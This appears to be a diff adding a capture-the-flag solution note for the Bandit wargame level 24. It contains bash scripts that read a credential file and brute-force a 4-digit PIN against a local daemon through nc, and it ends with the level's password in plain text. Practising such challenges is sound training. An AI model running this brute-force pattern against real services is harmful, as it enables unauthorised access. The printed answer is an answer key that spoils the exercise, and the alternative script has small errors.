@@ -1,0 +1,32 @@
+Task:
+    A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
+    
+Command:
+    password24=$(cat /etc/bandit_pass/bandit24)
+    for w in {0..9}
+    do 
+        for x in {0..9}
+        do 
+            for y in {0..9}
+            do 
+                for z in {0..9}
+                do 
+                    echo "pin: $w$x$y$z"
+                    echo "$password24 $w$x$y$z" | timeout 1 nc localhost 30002
+                done
+            done
+        done
+    done
+
+Alt
+    password24=$(cat /etc/bandit_pass/bandit24)
+    declare –a passwords=()
+    for i in {0000..9999}
+    do 
+        passwords+=("$password24 $i")
+    done
+    echo $passwords
+    printf "%s\n" "${passwords[@]}" | nc localhost 30002
+    
+Password: uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+
